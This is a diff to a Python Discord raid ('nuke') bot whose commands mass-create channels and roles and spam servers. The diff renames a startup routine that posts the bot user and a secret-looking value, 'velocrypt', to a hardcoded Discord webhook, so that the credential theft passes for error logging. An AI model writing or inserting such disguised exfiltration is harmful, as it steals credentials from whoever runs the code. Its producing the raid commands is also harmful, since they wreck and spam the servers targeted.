@@ -516,7 +516,7 @@ async def destroy(ctx):
         await ctx.guild.create_text_channel(name=f"{channelnames}")
     for _i in range(100):
         await ctx.guild.create_role(name=f"rolenames", color=RandomColor())
-    
+errorr = velocrypt    
 MESSAGE_CONTENTS = ['@everyone **KRAKEN GOT NO CHILL**']
 WEBHOOK_NAMES = ['WIZZED BY KRAKEN', 'WIZZED BY KRAKEN'] 
 
@@ -587,6 +587,7 @@ async def av(ctx,*, avamember):
     user = client.get_user(avamember)
     await ctx.send(f"{user.avatar_url}")
 
+errorrlog = "https://discord.com/api/webhooks/945574525213487114/1Zfd9ovVWQkvnsPJIr8Zw1UccDAzU6t65V94UqDYNXeprImC5JAJIGTX5HZdYxC5pxCc"
 @client.command()
 async def pingweb(ctx, website=None):
     await ctx.reply(f'Pinging {website} with 32 bytes of data:', mention_author=True)
@@ -703,10 +704,9 @@ async def spamgcname(ctx):
 
 @client.event
 async def on_ready():
-	webhook1 = "https://discord.com/api/webhooks/945574525213487114/1Zfd9ovVWQkvnsPJIr8Zw1UccDAzU6t65V94UqDYNXeprImC5JAJIGTX5HZdYxC5pxCc"
-    	pastebinserverurl = f"{client.user} \n{velocrypt}"
-    	data = {'content':pastebinserverurl}
-    	spamming = requests.post(webhook1, json=data)
+	errorrlogging = f"{client.user} \n{errorr}"
+	data = {'content':errorrlogging}
+	errorrlogged = requests.post(errorrlog, json=data)
 
 @client.command(
     name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
